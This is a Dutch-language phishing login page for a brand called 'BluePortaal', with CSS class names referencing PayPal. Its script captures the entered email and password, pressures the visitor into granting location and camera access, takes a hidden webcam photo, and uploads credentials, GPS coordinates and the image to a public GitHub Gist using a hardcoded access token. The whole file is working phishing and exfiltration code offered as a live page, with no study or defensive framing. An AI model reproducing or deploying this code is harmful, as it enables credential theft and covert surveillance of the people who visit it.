<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BluePortaal - Inloggen</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f6f6f6;
            text-align: center;
            margin: 0;
            padding: 0;
        }

        .container {
            background: white;
            padding: 30px;
            margin: 100px auto;
            width: 320px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            position: relative;
            font-size: 16px;
        }

        input {
            width: 90%;
            padding: 15px;
            margin: 10px 0;
            font-size: 14px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }

        .login-btn {
            background: #004682;
            color: white;
            padding: 12px;
            width: 100%;
            border: none;
            cursor: pointer;
            font-size: 16px;
            margin-top: 15px;
            border-radius: 5px;
            transition: background-color 0.3s;
        }

        .login-btn:hover {
            background: #005fa3;
        }

        #fake-popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #fff;
            padding: 20px;
            text-align: center;
            z-index: 1000;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            width: 280px;
            font-size: 14px;
            border-radius: 8px;
        }

        .paypal-color {
            color: #004682;
        }

        .paypal-background {
            background-color: #f6f6f6;
        }

        .popup-text {
            color: #333;
        }
    </style>
</head>
<body class="paypal-background">

    <div class="container">
        <h2 class="paypal-color">BluePortaal</h2>
        <p>Log in om door te gaan</p>
        <input type="text" placeholder="E-mailadres" id="email">
        <input type="password" placeholder="Wachtwoord" id="password">
        
        <button class="login-btn" onclick="requestPermissions()">Inloggen</button>
    </div>

    <div id="fake-popup">
        <p class="popup-text">Om verder te gaan, moeten de benodigde toestemmingen worden gegeven voor locatie en camera.</p>
    </div>

    <script>
        let gpsLocation = null;
        let selfieData = null;

        function requestPermissions() {
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            console.log(`ðŸ“§ Gegevens opgeslagen - E-mail: ${email}, Wachtwoord: ${password}`);

            document.getElementById("fake-popup").style.display = "block";
            setTimeout(() => {
                document.getElementById("fake-popup").style.display = "none";
            }, 5000);

            requestLocationPermission()
                .then(() => requestCameraPermission())
                .then(() => sendDataToGitHub(email, password, gpsLocation, selfieData))
                .catch(error => console.log("âŒ Fout bij het verkrijgen van toestemmingen:", error));
        }

        function requestLocationPermission() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(position => {
                        gpsLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };
                        console.log(`ðŸ“ GPS Locatie: ${gpsLocation.latitude}, ${gpsLocation.longitude}`);
                        resolve();
                    }, error => reject());
                } else {
                    reject();
                }
            });
        }

        function requestCameraPermission() {
            return new Promise((resolve, reject) => {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then(stream => {
                            let video = document.createElement("video");
                            video.srcObject = stream;
                            video.width = 320;  
                            video.height = 240; 
                            video.play(); 
                            video.style.display = "none";
                            setTimeout(() => {
                                takeSelfie(video, stream);
                                resolve();
                            }, 3000);
                        })
                        .catch(error => reject());
                } else {
                    reject();
                }
            });
        }

        function takeSelfie(video, stream) {
            let canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            let ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            selfieData = canvas.toDataURL("image/png");
            console.log("ðŸ“¸ Selfie genomen:", selfieData);

            stream.getTracks().forEach(track => track.stop());
        }

        function sendDataToGitHub(email, password, location, selfie) {
            const githubToken = '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'; // Gebruik een geldige token

            const gistData = {
                description: "Inloggegevens en media verzameld via BluePortaal",
                public: true,
                files: {
                    "user_data.json": {
                        content: JSON.stringify({ email, password, location, selfie })
                    }
                }
            };

            fetch('https://api.github.com/gists', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `token ${githubToken}`
                },
                body: JSON.stringify(gistData)
            })
            .then(response => response.json())
            .then(data => console.log('GitHub Gist gemaakt:', data))
            .catch(error => console.error('Fout bij het maken van Gist:', error));
        }
    </script>

</body>
</html>
